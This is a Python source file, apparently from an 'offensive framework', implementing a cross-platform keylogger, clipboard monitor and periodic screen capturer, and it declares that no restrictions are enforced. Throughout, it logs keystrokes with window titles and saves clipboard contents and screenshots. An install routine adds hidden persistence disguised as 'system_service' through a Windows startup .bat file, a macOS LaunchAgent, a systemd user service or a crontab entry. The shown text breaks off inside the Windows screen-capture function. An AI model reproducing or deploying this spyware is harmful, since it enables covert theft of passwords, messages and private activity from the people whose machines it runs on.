"""
G3r4ki Offensive Framework - Advanced Keylogging & Screen Capture Module

This module provides keylogging, clipboard scraping, and screen capture capabilities
for monitoring user activity on target systems. It supports various platforms with
appropriate hooks to capture input events.

No capability limitations or restrictions are enforced.
"""

import os
import sys
import time
import json
import base64
import logging
import threading
import datetime
import tempfile
import platform
import subprocess
from typing import Dict, List, Any, Optional, Union, Callable, Tuple

# Configure logging
logger = logging.getLogger("g3r4ki.offensive.keylogging")

class KeyloggerModule:
    """Advanced keylogging and screen capture module for G3r4ki offensive operations."""
    
    def __init__(self, options: Optional[Dict[str, Any]] = None):
        """
        Initialize the keylogging module.
        
        Args:
            options: Module configuration options
        """
        self.options = options or {}
        self.output_dir = self.options.get("output_dir", "results/keylogging")
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Keylogger configuration
        self.keylog_interval = self.options.get("keylog_interval", 60)  # Save interval in seconds
        self.screenshot_interval = self.options.get("screenshot_interval", 300)  # Screenshot interval in seconds
        self.clipboard_interval = self.options.get("clipboard_interval", 30)  # Clipboard check interval in seconds
        self.max_file_size = self.options.get("max_file_size", 10 * 1024 * 1024)  # 10 MB max file size
        
        # Runtime attributes
        self.keylogger_running = False
        self.screencapture_running = False
        self.clipboard_monitor_running = False
        
        self.keylogger_thread = None
        self.screencapture_thread = None
        self.clipboard_thread = None
        
        self.keylog_data = []
        self.keylog_file = None
        self.last_clipboard_content = None
        
        # Detect platform
        self.system_platform = platform.system().lower()
        
        # For Linux X11 keylogging
        self.x11_display = self.options.get("x11_display", os.environ.get("DISPLAY", ":0"))
        
    def start_keylogger(self, log_file: Optional[str] = None) -> Dict[str, Any]:
        """
        Start keylogging on the target system.
        
        Args:
            log_file: Optional file path to save keylog data
            
        Returns:
            Dictionary with keylogger status
        """
        if self.keylogger_running:
            return {"success": False, "error": "Keylogger already running"}
        
        try:
            # Initialize keylog file
            self.keylog_file = log_file or os.path.join(self.output_dir, f"keylog_{self._get_timestamp()}.txt")
            self.keylog_data = []
            
            # Initialize platform-specific keylogger
            if self.system_platform == "windows":
                # Windows keylogging
                if not self._check_dependency("pynput", "pip install pynput"):
                    return {"success": False, "error": "Missing dependency: pynput"}
                    
                # Initialize Windows hooks
                self.keylogger_thread = threading.Thread(target=self._windows_keylogger)
                
            elif self.system_platform == "darwin":
                # macOS keylogging
                if not self._check_dependency("pynput", "pip install pynput"):
                    return {"success": False, "error": "Missing dependency: pynput"}
                    
                # Initialize macOS hooks
                self.keylogger_thread = threading.Thread(target=self._macos_keylogger)
                
            elif self.system_platform == "linux":
                # Linux keylogging
                if not self._check_dependency("pynput", "pip install pynput"):
                    return {"success": False, "error": "Missing dependency: pynput"}
                    
                # Initialize Linux hooks
                self.keylogger_thread = threading.Thread(target=self._linux_keylogger)
            
            else:
                return {"success": False, "error": f"Unsupported platform: {self.system_platform}"}
            
            # Start keylogger thread
            self.keylogger_running = True
            self.keylogger_thread.daemon = True
            self.keylogger_thread.start()
            
            logger.info(f"Keylogger started. Logging to {self.keylog_file}")
            
            return {
                "success": True,
                "message": "Keylogger started",
                "log_file": self.keylog_file,
                "platform": self.system_platform
            }
        
        except Exception as e:
            logger.error(f"Error starting keylogger: {e}")
            return {"success": False, "error": str(e)}
    
    def stop_keylogger(self) -> Dict[str, Any]:
        """
        Stop the active keylogger.
        
        Returns:
            Dictionary with operation status
        """
        if not self.keylogger_running:
            return {"success": False, "error": "Keylogger not running"}
        
        try:
            # Signal keylogger to stop
            self.keylogger_running = False
            
            # Wait for thread to finish (with timeout)
            if self.keylogger_thread and self.keylogger_thread.is_alive():
                self.keylogger_thread.join(timeout=5)
            
            # Save any remaining data
            self._save_keylog_data()
            
            logger.info("Keylogger stopped")
            return {
                "success": True,
                "message": "Keylogger stopped",
                "log_file": self.keylog_file
            }
        
        except Exception as e:
            logger.error(f"Error stopping keylogger: {e}")
            return {"success": False, "error": str(e)}
    
    def start_clipboard_monitor(self, log_file: Optional[str] = None) -> Dict[str, Any]:
        """
        Start monitoring clipboard on the target system.
        
        Args:
            log_file: Optional file path to save clipboard data
            
        Returns:
            Dictionary with operation status
        """
        if self.clipboard_monitor_running:
            return {"success": False, "error": "Clipboard monitor already running"}
        
        try:
            # Initialize clip log file
            self.clipboard_file = log_file or os.path.join(self.output_dir, f"clipboard_{self._get_timestamp()}.txt")
            
            # Initialize platform-specific clipboard monitor
            if self.system_platform == "windows":
                # Windows clipboard monitoring
                if not self._check_dependency("pywin32", "pip install pywin32"):
                    return {"success": False, "error": "Missing dependency: pywin32"}
                    
                # Initialize Windows hooks
                self.clipboard_thread = threading.Thread(target=self._windows_clipboard_monitor)
                
            elif self.system_platform == "darwin":
                # macOS clipboard monitoring
                if not self._check_dependency("pyobjc", "pip install pyobjc"):
                    return {"success": False, "error": "Missing dependency: pyobjc"}
                    
                # Initialize macOS hooks
                self.clipboard_thread = threading.Thread(target=self._macos_clipboard_monitor)
                
            elif self.system_platform == "linux":
                # Linux clipboard monitoring
                if not self._check_dependency("pyperclip", "pip install pyperclip"):
                    return {"success": False, "error": "Missing dependency: pyperclip"}
                    
                # Initialize Linux hooks
                self.clipboard_thread = threading.Thread(target=self._linux_clipboard_monitor)
            
            else:
                return {"success": False, "error": f"Unsupported platform: {self.system_platform}"}
            
            # Start clipboard monitor thread
            self.clipboard_monitor_running = True
            self.clipboard_thread.daemon = True
            self.clipboard_thread.start()
            
            logger.info(f"Clipboard monitor started. Logging to {self.clipboard_file}")
            
            return {
                "success": True,
                "message": "Clipboard monitor started",
                "log_file": self.clipboard_file,
                "platform": self.system_platform
            }
        
        except Exception as e:
            logger.error(f"Error starting clipboard monitor: {e}")
            return {"success": False, "error": str(e)}
    
    def stop_clipboard_monitor(self) -> Dict[str, Any]:
        """
        Stop the active clipboard monitor.
        
        Returns:
            Dictionary with operation status
        """
        if not self.clipboard_monitor_running:
            return {"success": False, "error": "Clipboard monitor not running"}
        
        try:
            # Signal monitor to stop
            self.clipboard_monitor_running = False
            
            # Wait for thread to finish (with timeout)
            if self.clipboard_thread and self.clipboard_thread.is_alive():
                self.clipboard_thread.join(timeout=5)
            
            logger.info("Clipboard monitor stopped")
            return {
                "success": True,
                "message": "Clipboard monitor stopped",
                "log_file": self.clipboard_file
            }
        
        except Exception as e:
            logger.error(f"Error stopping clipboard monitor: {e}")
            return {"success": False, "error": str(e)}
    
    def start_screen_capture(self, output_dir: Optional[str] = None, 
                           interval: Optional[int] = None) -> Dict[str, Any]:
        """
        Start periodic screen capture on the target system.
        
        Args:
            output_dir: Optional directory to save screenshots
            interval: Optional interval between captures in seconds
            
        Returns:
            Dictionary with operation status
        """
        if self.screencapture_running:
            return {"success": False, "error": "Screen capture already running"}
        
        try:
            # Set output directory
            self.screenshot_dir = output_dir or os.path.join(self.output_dir, f"screenshots_{self._get_timestamp()}")
            os.makedirs(self.screenshot_dir, exist_ok=True)
            
            # Set interval
            if interval is not None:
                self.screenshot_interval = interval
            
            # Initialize platform-specific screen capture
            if self.system_platform == "windows":
                # Windows screen capture
                if not self._check_dependency("PIL", "pip install pillow"):
                    return {"success": False, "error": "Missing dependency: pillow"}
                    
                # Initialize Windows screen capture
                self.screencapture_thread = threading.Thread(target=self._windows_screen_capture)
                
            elif self.system_platform == "darwin":
                # macOS screen capture
                # No additional dependencies needed - uses built-in screencapture utility
                    
                # Initialize macOS screen capture
                self.screencapture_thread = threading.Thread(target=self._macos_screen_capture)
                
            elif self.system_platform == "linux":
                # Linux screen capture
                if not self._check_dependency("PIL", "pip install pillow"):
                    return {"success": False, "error": "Missing dependency: pillow"}
                
                # Check for scrot utility on Linux
                if not self._check_command("scrot"):
                    if not self._check_command("import"):
                        return {"success": False, "error": "Missing command: scrot or import (ImageMagick)"}
                    
                # Initialize Linux screen capture
                self.screencapture_thread = threading.Thread(target=self._linux_screen_capture)
            
            else:
                return {"success": False, "error": f"Unsupported platform: {self.system_platform}"}
            
            # Start screen capture thread
            self.screencapture_running = True
            self.screencapture_thread.daemon = True
            self.screencapture_thread.start()
            
            logger.info(f"Screen capture started. Saving to {self.screenshot_dir}")
            
            return {
                "success": True,
                "message": "Screen capture started",
                "output_dir": self.screenshot_dir,
                "interval": self.screenshot_interval,
                "platform": self.system_platform
            }
        
        except Exception as e:
            logger.error(f"Error starting screen capture: {e}")
            return {"success": False, "error": str(e)}
    
    def stop_screen_capture(self) -> Dict[str, Any]:
        """
        Stop the active screen capture.
        
        Returns:
            Dictionary with operation status
        """
        if not self.screencapture_running:
            return {"success": False, "error": "Screen capture not running"}
        
        try:
            # Signal screen capture to stop
            self.screencapture_running = False
            
            # Wait for thread to finish (with timeout)
            if self.screencapture_thread and self.screencapture_thread.is_alive():
                self.screencapture_thread.join(timeout=5)
            
            logger.info("Screen capture stopped")
            return {
                "success": True,
                "message": "Screen capture stopped",
                "output_dir": self.screenshot_dir
            }
        
        except Exception as e:
            logger.error(f"Error stopping screen capture: {e}")
            return {"success": False, "error": str(e)}
    
    def capture_screenshot(self, output_file: Optional[str] = None) -> Dict[str, Any]:
        """
        Capture a single screenshot.
        
        Args:
            output_file: Optional file path to save screenshot
            
        Returns:
            Dictionary with operation status and screenshot path
        """
        try:
            # Generate output file if not provided
            if not output_file:
                screenshot_dir = os.path.join(self.output_dir, "screenshots")
                os.makedirs(screenshot_dir, exist_ok=True)
                output_file = os.path.join(screenshot_dir, f"screenshot_{self._get_timestamp()}.png")
            
            # Capture screenshot using platform-specific method
            if self.system_platform == "windows":
                # Windows screenshot
                if not self._check_dependency("PIL", "pip install pillow"):
                    return {"success": False, "error": "Missing dependency: pillow"}
                
                success = self._capture_windows_screenshot(output_file)
                
            elif self.system_platform == "darwin":
                # macOS screenshot
                success = self._capture_macos_screenshot(output_file)
                
            elif self.system_platform == "linux":
                # Linux screenshot
                success = self._capture_linux_screenshot(output_file)
                
            else:
                return {"success": False, "error": f"Unsupported platform: {self.system_platform}"}
            
            if not success:
                return {"success": False, "error": "Failed to capture screenshot"}
            
            # Check if file was created
            if not os.path.exists(output_file):
                return {"success": False, "error": "Screenshot file not created"}
            
            # Convert to base64 for direct use
            with open(output_file, "rb") as f:
                screenshot_data = f.read()
                screenshot_base64 = base64.b64encode(screenshot_data).decode()
            
            logger.info(f"Screenshot captured and saved to {output_file}")
            
            return {
                "success": True,
                "message": "Screenshot captured",
                "screenshot_file": output_file,
                "screenshot_data": screenshot_base64,
                "file_size": os.path.getsize(output_file)
            }
        
        except Exception as e:
            logger.error(f"Error capturing screenshot: {e}")
            return {"success": False, "error": str(e)}
    
    def get_clipboard_content(self) -> Dict[str, Any]:
        """
        Get the current clipboard content.
        
        Returns:
            Dictionary with operation status and clipboard content
        """
        try:
            clipboard_content = None
            
            # Get clipboard content using platform-specific method
            if self.system_platform == "windows":
                # Windows clipboard access
                if not self._check_dependency("pywin32", "pip install pywin32"):
                    return {"success": False, "error": "Missing dependency: pywin32"}
                
                clipboard_content = self._get_windows_clipboard()
                
            elif self.system_platform == "darwin":
                # macOS clipboard access
                if not self._check_dependency("pyobjc", "pip install pyobjc"):
                    return {"success": False, "error": "Missing dependency: pyobjc"}
                
                clipboard_content = self._get_macos_clipboard()
                
            elif self.system_platform == "linux":
                # Linux clipboard access
                if not self._check_dependency("pyperclip", "pip install pyperclip"):
                    return {"success": False, "error": "Missing dependency: pyperclip"}
                
                clipboard_content = self._get_linux_clipboard()
                
            else:
                return {"success": False, "error": f"Unsupported platform: {self.system_platform}"}
            
            if clipboard_content is None:
                return {"success": False, "error": "Failed to get clipboard content"}
            
            logger.info("Clipboard content retrieved")
            
            return {
                "success": True,
                "message": "Clipboard content retrieved",
                "clipboard_content": clipboard_content,
                "timestamp": self._get_timestamp(include_time=True)
            }
        
        except Exception as e:
            logger.error(f"Error getting clipboard content: {e}")
            return {"success": False, "error": str(e)}
    
    def install_global_keylogger(self, startup: bool = True, hidden: bool = True) -> Dict[str, Any]:
        """
        Install a global keylogger that runs at system startup.
        
        Args:
            startup: Whether to add to system startup
            hidden: Whether to run in hidden mode
            
        Returns:
            Dictionary with installation status
        """
        try:
            # Get path to the current script
            script_path = os.path.abspath(__file__)
            
            # Create launcher script that imports and runs this module
            launcher_code = """#!/usr/bin/env python3
# Keylogger Launcher

import os
import sys
import time
import threading

# Add parent directory to path to import from src
parent_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
sys.path.insert(0, parent_dir)

# Import keylogger module
from src.offensive.modules.keylogging import KeyloggerModule

def main():
    # Initialize keylogger
    keylogger = KeyloggerModule({
        "output_dir": os.path.join(os.path.expanduser("~"), ".logs")
    })
    
    # Start keylogger
    keylogger.start_keylogger()
    
    # Start clipboard monitor
    keylogger.start_clipboard_monitor()
    
    # Start screen capture
    keylogger.start_screen_capture(interval=300)  # Every 5 minutes
    
    # Keep running
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass
    finally:
        # Cleanup
        keylogger.stop_keylogger()
        keylogger.stop_clipboard_monitor()
        keylogger.stop_screen_capture()

if __name__ == "__main__":
    # Run in background thread
    if os.name != 'nt':
        try:
            pid = os.fork()
            if pid > 0:
                # Exit parent process
                sys.exit(0)
        except OSError:
            sys.exit(1)
        
        # Detach from terminal
        os.setsid()
        os.umask(0)
        
        # Close file descriptors
        for fd in range(3):
            try:
                os.close(fd)
            except:
                pass
    
    # Start the main function
    main()
"""
            
            # Save launcher script
            launcher_dir = os.path.join(self.output_dir, "launcher")
            os.makedirs(launcher_dir, exist_ok=True)
            
            launcher_file = os.path.join(launcher_dir, "keylogger_launcher.py")
            with open(launcher_file, "w") as f:
                f.write(launcher_code)
            
            # Make launcher executable
            os.chmod(launcher_file, 0o755)
            
            # Install into startup based on platform
            startup_file = None
            
            if startup:
                if self.system_platform == "windows":
                    # Windows startup
                    if not self._check_dependency("pywin32", "pip install pywin32"):
                        return {"success": False, "error": "Missing dependency: pywin32"}
                    
                    startup_dir = os.path.join(os.environ.get('APPDATA', ''), 
                                              "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                    
                    # Create a .bat file to run the launcher
                    bat_content = f"@echo off\npythonw.exe {launcher_file}\n"
                    
                    startup_file = os.path.join(startup_dir, "system_service.bat")
                    with open(startup_file, "w") as f:
                        f.write(bat_content)
                    
                elif self.system_platform == "darwin":
                    # macOS startup (LaunchAgent)
                    launch_agents_dir = os.path.join(os.path.expanduser("~"), 
                                                    "Library/LaunchAgents")
                    os.makedirs(launch_agents_dir, exist_ok=True)
                    
                    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{launcher_file}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"""
                    
                    startup_file = os.path.join(launch_agents_dir, "com.system.service.plist")
                    with open(startup_file, "w") as f:
                        f.write(plist_content)
                    
                    # Load the LaunchAgent
                    subprocess.run(["launchctl", "load", startup_file], check=False)
                    
                elif self.system_platform == "linux":
                    # Linux startup (crontab or systemd)
                    # Try systemd first (user service)
                    
                    systemd_dir = os.path.join(os.path.expanduser("~"), ".config/systemd/user")
                    if os.path.exists("/run/systemd/system"):
                        # System supports systemd
                        os.makedirs(systemd_dir, exist_ok=True)
                        
                        service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {launcher_file}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
                        
                        startup_file = os.path.join(systemd_dir, "system_service.service")
                        with open(startup_file, "w") as f:
                            f.write(service_content)
                        
                        # Enable and start the service
                        subprocess.run(["systemctl", "--user", "enable", "system_service.service"], check=False)
                        subprocess.run(["systemctl", "--user", "start", "system_service.service"], check=False)
                    else:
                        # Fall back to crontab
                        try:
                            # Add to crontab
                            crontab_cmd = f"@reboot python3 {launcher_file}"
                            subprocess.run(f'(crontab -l 2>/dev/null; echo "{crontab_cmd}") | crontab -', 
                                         shell=True, check=False)
                            
                            startup_file = "crontab"
                        except:
                            pass
            
            return {
                "success": True,
                "message": "Global keylogger installed",
                "launcher_file": launcher_file,
                "startup_file": startup_file,
                "startup_enabled": startup,
                "hidden": hidden
            }
        
        except Exception as e:
            logger.error(f"Error installing global keylogger: {e}")
            return {"success": False, "error": str(e)}
    
    def uninstall_global_keylogger(self) -> Dict[str, Any]:
        """
        Uninstall the global keylogger.
        
        Returns:
            Dictionary with uninstallation status
        """
        try:
            # Uninstall from startup based on platform
            if self.system_platform == "windows":
                # Windows startup
                startup_dir = os.path.join(os.environ.get('APPDATA', ''), 
                                          "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                startup_file = os.path.join(startup_dir, "system_service.bat")
                
                if os.path.exists(startup_file):
                    os.remove(startup_file)
                
            elif self.system_platform == "darwin":
                # macOS startup (LaunchAgent)
                launch_agents_dir = os.path.join(os.path.expanduser("~"), 
                                                "Library/LaunchAgents")
                startup_file = os.path.join(launch_agents_dir, "com.system.service.plist")
                
                if os.path.exists(startup_file):
                    # Unload the LaunchAgent
                    subprocess.run(["launchctl", "unload", startup_file], check=False)
                    os.remove(startup_file)
                
            elif self.system_platform == "linux":
                # Linux startup (systemd)
                systemd_dir = os.path.join(os.path.expanduser("~"), ".config/systemd/user")
                startup_file = os.path.join(systemd_dir, "system_service.service")
                
                if os.path.exists(startup_file):
                    # Disable and stop the service
                    subprocess.run(["systemctl", "--user", "stop", "system_service.service"], check=False)
                    subprocess.run(["systemctl", "--user", "disable", "system_service.service"], check=False)
                    os.remove(startup_file)
                else:
                    # Check crontab
                    try:
                        # Remove from crontab
                        subprocess.run("crontab -l | grep -v keylogger_launcher | crontab -", 
                                     shell=True, check=False)
                    except:
                        pass
            
            # Also look for and kill any running instances
            try:
                if self.system_platform == "windows":
                    # Windows process kill
                    subprocess.run(["taskkill", "/F", "/IM", "pythonw.exe", "/T"], check=False)
                else:
                    # Unix-like process kill
                    subprocess.run(["pkill", "-f", "keylogger_launcher.py"], check=False)
            except:
                pass
            
            return {
                "success": True,
                "message": "Global keylogger uninstalled"
            }
        
        except Exception as e:
            logger.error(f"Error uninstalling global keylogger: {e}")
            return {"success": False, "error": str(e)}
    
    def get_keylog_data(self, format_output: bool = True) -> Dict[str, Any]:
        """
        Get captured keylog data.
        
        Args:
            format_output: Whether to format the output for readability
            
        Returns:
            Dictionary with keylog data
        """
        try:
            if not self.keylog_file or not os.path.exists(self.keylog_file):
                return {"success": False, "error": "No keylog data available"}
            
            # Read keylog file
            with open(self.keylog_file, "r", encoding="utf-8", errors="ignore") as f:
                keylog_data = f.read()
            
            # Format output if requested
            if format_output:
                # Simple formatting for now
                formatted_data = keylog_data
            else:
                formatted_data = keylog_data
            
            return {
                "success": True,
                "keylog_data": keylog_data,
                "formatted_data": formatted_data,
                "keylog_file": self.keylog_file,
                "file_size": os.path.getsize(self.keylog_file)
            }
        
        except Exception as e:
            logger.error(f"Error getting keylog data: {e}")
            return {"success": False, "error": str(e)}
    
    def get_screenshots(self, max_count: int = 10, 
                       include_data: bool = False) -> Dict[str, Any]:
        """
        Get captured screenshots.
        
        Args:
            max_count: Maximum number of screenshots to return
            include_data: Whether to include the base64 encoded image data
            
        Returns:
            Dictionary with screenshot information
        """
        try:
            if not hasattr(self, "screenshot_dir") or not os.path.exists(self.screenshot_dir):
                return {"success": False, "error": "No screenshots available"}
            
            # Get list of screenshots
            screenshots = []
            for filename in os.listdir(self.screenshot_dir):
                if filename.lower().endswith((".png", ".jpg", ".jpeg")):
                    filepath = os.path.join(self.screenshot_dir, filename)
                    
                    screenshot_info = {
                        "filename": filename,
                        "filepath": filepath,
                        "size": os.path.getsize(filepath),
                        "timestamp": self._get_file_timestamp(filepath)
                    }
                    
                    if include_data:
                        # Include base64 encoded data
                        with open(filepath, "rb") as f:
                            screenshot_data = f.read()
                            screenshot_info["data"] = base64.b64encode(screenshot_data).decode()
                    
                    screenshots.append(screenshot_info)
            
            # Sort by timestamp (newest first)
            screenshots.sort(key=lambda x: x["timestamp"], reverse=True)
            
            # Limit to max_count
            screenshots = screenshots[:max_count]
            
            return {
                "success": True,
                "screenshots": screenshots,
                "count": len(screenshots),
                "directory": self.screenshot_dir
            }
        
        except Exception as e:
            logger.error(f"Error getting screenshots: {e}")
            return {"success": False, "error": str(e)}
    
    def get_clipboard_history(self) -> Dict[str, Any]:
        """
        Get captured clipboard history.
        
        Returns:
            Dictionary with clipboard history
        """
        try:
            if not hasattr(self, "clipboard_file") or not os.path.exists(self.clipboard_file):
                return {"success": False, "error": "No clipboard history available"}
            
            # Read clipboard file
            with open(self.clipboard_file, "r", encoding="utf-8", errors="ignore") as f:
                clipboard_data = f.readlines()
            
            # Parse clipboard history
            clipboard_history = []
            current_entry = {}
            
            for line in clipboard_data:
                line = line.strip()
                
                if line.startswith("[") and "]" in line:
                    # Parse timestamp entry
                    timestamp_str = line.strip("[]")
                    
                    if current_entry and "timestamp" in current_entry and "content" in current_entry:
                        clipboard_history.append(current_entry)
                    
                    current_entry = {"timestamp": timestamp_str, "content": ""}
                elif current_entry and "timestamp" in current_entry:
                    # Add content to current entry
                    if current_entry["content"]:
                        current_entry["content"] += "\n"
                    current_entry["content"] += line
            
            # Add last entry if not empty
            if current_entry and "timestamp" in current_entry and "content" in current_entry:
                clipboard_history.append(current_entry)
            
            return {
                "success": True,
                "clipboard_history": clipboard_history,
                "count": len(clipboard_history),
                "clipboard_file": self.clipboard_file,
                "file_size": os.path.getsize(self.clipboard_file)
            }
        
        except Exception as e:
            logger.error(f"Error getting clipboard history: {e}")
            return {"success": False, "error": str(e)}
    
    def _windows_keylogger(self) -> None:
        """Windows-specific keylogger implementation."""
        try:
            from pynput import keyboard
            
            # Current window title
            current_window = ""
            last_window_check = time.time()
            window_check_interval = 1.0  # Check window title every second
            
            # Function to get active window title
            def get_active_window_title():
                try:
                    import win32gui
                    window = win32gui.GetForegroundWindow()
                    return win32gui.GetWindowText(window)
                except:
                    return "Unknown Window"
            
            def on_press(key):
                if not self.keylogger_running:
                    return False  # Stop listener
                
                nonlocal current_window, last_window_check
                
                # Check if window has changed
                now = time.time()
                if now - last_window_check >= window_check_interval:
                    new_window = get_active_window_title()
                    if new_window != current_window:
                        current_window = new_window
                        self.keylog_data.append(f"\n[{self._get_timestamp(include_time=True)}] Window: {current_window}\n")
                    last_window_check = now
                
                try:
                    # Regular alphanumeric key
                    char = key.char
                    self.keylog_data.append(char)
                except AttributeError:
                    # Special key
                    char = f"[{key}]"
                    self.keylog_data.append(char)
                
                # Save periodically
                if len(self.keylog_data) >= 100:
                    self._save_keylog_data()
            
            # Start keyboard listener
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            # Run until stopped
            last_save_time = time.time()
            while self.keylogger_running:
                time.sleep(1)
                
                # Save periodically based on time
                now = time.time()
                if now - last_save_time >= self.keylog_interval:
                    self._save_keylog_data()
                    last_save_time = now
            
            # Clean up
            listener.stop()
            self._save_keylog_data()
            
        except Exception as e:
            logger.error(f"Windows keylogger error: {e}")
            self.keylogger_running = False
    
    def _macos_keylogger(self) -> None:
        """macOS-specific keylogger implementation."""
        try:
            from pynput import keyboard
            
            # Current window title
            current_window = ""
            last_window_check = time.time()
            window_check_interval = 1.0  # Check window title every second
            
            # Function to get active window title
            def get_active_window_title():
                try:
                    import subprocess
                    script = 'tell application "System Events" to get name of first application process whose frontmost is true'
                    output = subprocess.check_output(["osascript", "-e", script]).decode().strip()
                    return output
                except:
                    return "Unknown Window"
            
            def on_press(key):
                if not self.keylogger_running:
                    return False  # Stop listener
                
                nonlocal current_window, last_window_check
                
                # Check if window has changed
                now = time.time()
                if now - last_window_check >= window_check_interval:
                    new_window = get_active_window_title()
                    if new_window != current_window:
                        current_window = new_window
                        self.keylog_data.append(f"\n[{self._get_timestamp(include_time=True)}] Window: {current_window}\n")
                    last_window_check = now
                
                try:
                    # Regular alphanumeric key
                    char = key.char
                    self.keylog_data.append(char)
                except AttributeError:
                    # Special key
                    char = f"[{key}]"
                    self.keylog_data.append(char)
                
                # Save periodically
                if len(self.keylog_data) >= 100:
                    self._save_keylog_data()
            
            # Start keyboard listener
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            # Run until stopped
            last_save_time = time.time()
            while self.keylogger_running:
                time.sleep(1)
                
                # Save periodically based on time
                now = time.time()
                if now - last_save_time >= self.keylog_interval:
                    self._save_keylog_data()
                    last_save_time = now
            
            # Clean up
            listener.stop()
            self._save_keylog_data()
            
        except Exception as e:
            logger.error(f"macOS keylogger error: {e}")
            self.keylogger_running = False
    
    def _linux_keylogger(self) -> None:
        """Linux-specific keylogger implementation."""
        try:
            from pynput import keyboard
            
            # Current window title
            current_window = ""
            last_window_check = time.time()
            window_check_interval = 1.0  # Check window title every second
            
            # Function to get active window title
            def get_active_window_title():
                try:
                    import subprocess
                    output = subprocess.check_output(["xdotool", "getwindowfocus", "getwindowname"]).decode().strip()
                    return output
                except:
                    return "Unknown Window"
            
            def on_press(key):
                if not self.keylogger_running:
                    return False  # Stop listener
                
                nonlocal current_window, last_window_check
                
                # Check if window has changed
                now = time.time()
                if now - last_window_check >= window_check_interval:
                    new_window = get_active_window_title()
                    if new_window != current_window:
                        current_window = new_window
                        self.keylog_data.append(f"\n[{self._get_timestamp(include_time=True)}] Window: {current_window}\n")
                    last_window_check = now
                
                try:
                    # Regular alphanumeric key
                    char = key.char
                    self.keylog_data.append(char)
                except AttributeError:
                    # Special key
                    char = f"[{key}]"
                    self.keylog_data.append(char)
                
                # Save periodically
                if len(self.keylog_data) >= 100:
                    self._save_keylog_data()
            
            # Start keyboard listener
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            # Run until stopped
            last_save_time = time.time()
            while self.keylogger_running:
                time.sleep(1)
                
                # Save periodically based on time
                now = time.time()
                if now - last_save_time >= self.keylog_interval:
                    self._save_keylog_data()
                    last_save_time = now
            
            # Clean up
            listener.stop()
            self._save_keylog_data()
            
        except Exception as e:
            logger.error(f"Linux keylogger error: {e}")
            self.keylogger_running = False
    
    def _windows_clipboard_monitor(self) -> None:
        """Windows-specific clipboard monitor implementation."""
        try:
            import win32clipboard
            
            self.last_clipboard_content = None
            
            while self.clipboard_monitor_running:
                try:
                    # Get clipboard content
                    win32clipboard.OpenClipboard()
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                        clipboard_content = clipboard_data.decode('utf-8', errors='ignore')
                    elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                        clipboard_content = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                    else:
                        clipboard_content = None
                    win32clipboard.CloseClipboard()
                    
                    # Check if content has changed
                    if clipboard_content and clipboard_content != self.last_clipboard_content:
                        self.last_clipboard_content = clipboard_content
                        
                        # Write to clipboard log
                        with open(self.clipboard_file, "a", encoding="utf-8", errors="ignore") as f:
                            f.write(f"[{self._get_timestamp(include_time=True)}]\n")
                            f.write(clipboard_content)
                            f.write("\n\n")
                except:
                    pass
                
                # Sleep before checking again
                time.sleep(self.clipboard_interval)
                
        except Exception as e:
            logger.error(f"Windows clipboard monitor error: {e}")
            self.clipboard_monitor_running = False
    
    def _macos_clipboard_monitor(self) -> None:
        """macOS-specific clipboard monitor implementation."""
        try:
            # We'll use the AppKit framework via pyobjc
            from AppKit import NSPasteboard, NSStringPboardType
            
            self.last_clipboard_content = None
            pasteboard = NSPasteboard.generalPasteboard()
            last_change_count = pasteboard.changeCount()
            
            while self.clipboard_monitor_running:
                try:
                    # Check if clipboard has changed
                    current_change_count = pasteboard.changeCount()
                    if current_change_count != last_change_count:
                        last_change_count = current_change_count
                        
                        # Get clipboard content
                        clipboard_content = pasteboard.stringForType_(NSStringPboardType)
                        
                        # Check if content is valid and has changed
                        if clipboard_content and clipboard_content != self.last_clipboard_content:
                            self.last_clipboard_content = clipboard_content
                            
                            # Write to clipboard log
                            with open(self.clipboard_file, "a", encoding="utf-8", errors="ignore") as f:
                                f.write(f"[{self._get_timestamp(include_time=True)}]\n")
                                f.write(clipboard_content)
                                f.write("\n\n")
                except:
                    pass
                
                # Sleep before checking again
                time.sleep(self.clipboard_interval)
                
        except Exception as e:
            logger.error(f"macOS clipboard monitor error: {e}")
            self.clipboard_monitor_running = False
    
    def _linux_clipboard_monitor(self) -> None:
        """Linux-specific clipboard monitor implementation."""
        try:
            import pyperclip
            
            self.last_clipboard_content = pyperclip.paste()
            
            while self.clipboard_monitor_running:
                try:
                    # Get clipboard content
                    clipboard_content = pyperclip.paste()
                    
                    # Check if content has changed
                    if clipboard_content and clipboard_content != self.last_clipboard_content:
                        self.last_clipboard_content = clipboard_content
                        
                        # Write to clipboard log
                        with open(self.clipboard_file, "a", encoding="utf-8", errors="ignore") as f:
                            f.write(f"[{self._get_timestamp(include_time=True)}]\n")
                            f.write(clipboard_content)
                            f.write("\n\n")
                except:
                    pass
                
                # Sleep before checking again
                time.sleep(self.clipboard_interval)
                
        except Exception as e:
            logger.error(f"Linux clipboard monitor error: {e}")
            self.clipboard_monitor_running = False
    
    def _windows_screen_capture(self) -> None:
        """Windows-specific screen capture implementation."""
        try:
            from PIL import ImageGrab
            
            screenshot_count = 0
            
            while self.screencapture_running:
                try:
                    # Capture screenshot
                    screenshot = ImageGrab.grab()
                    
                    # Generate filename
